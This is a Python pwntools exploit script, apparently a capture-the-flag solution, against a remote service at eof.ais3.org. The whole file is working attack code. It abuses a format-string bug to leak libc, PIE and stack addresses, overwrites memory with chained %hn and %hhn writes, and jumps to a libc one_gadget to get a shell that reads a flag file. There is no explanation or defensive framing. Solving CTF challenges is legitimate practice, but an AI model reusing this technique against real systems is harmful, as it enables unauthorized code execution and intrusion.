#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

l = ELF( './libc-2.27.so' )

def fmt( p , r = True ):
    if r:
        y.send( p + 'AAA\0' )
        y.recvuntil( 'AAA' )
    else:
        y.send( p + '\0' )
        sleep( 0.16 )


y = remote( 'eof.ais3.org' , 6666 )

fmt( '%10$p.%6$p.%5$p.' , False )
y.recvuntil( '0x' )

l.address = int( y.recvuntil('.')[:-1] , 16 ) - 0x21b97
success( 'libc -> %s' % hex( l.address ) )
pie = int( y.recvuntil('.')[:-1] , 16 ) - 0x11fa
success( 'pie -> %s' % hex( pie ) )
stk = int( y.recvuntil('.')[:-1] , 16 )
success( 'stk -> %s' % hex( stk ) )

fmt( '%{}c%7$hn'.format( (pie + 0x4018) & 0xffff ) )

t = (stk & 0xff) + 0x10 + 8
fmt( '%{}c%5$hhn'.format( t ) )
fmt( '%{}c%7$hn'.format( (pie + 0x401a) & 0xffff ) )
fmt( '%{}c%5$hhn'.format( t + 2 ) )
fmt( '%{}c%7$hn'.format( (pie >> 16) & 0xffff ) )
fmt( '%{}c%5$hhn'.format( t + 4 ) )
fmt( '%{}c%7$hn'.format( pie >> 32 ) )

one = l.address + 0x10a38c
a = (one >> 16) & 0xff
b = one & 0xffff

fmt( '%{}c%10$hhn%{}c%9$hn'.format( a , b - a ) )

y.sendline( 'yuawn' )
sleep( 0.2 )

y.sendline( 'cat /home/*/flag' )

y.interactive()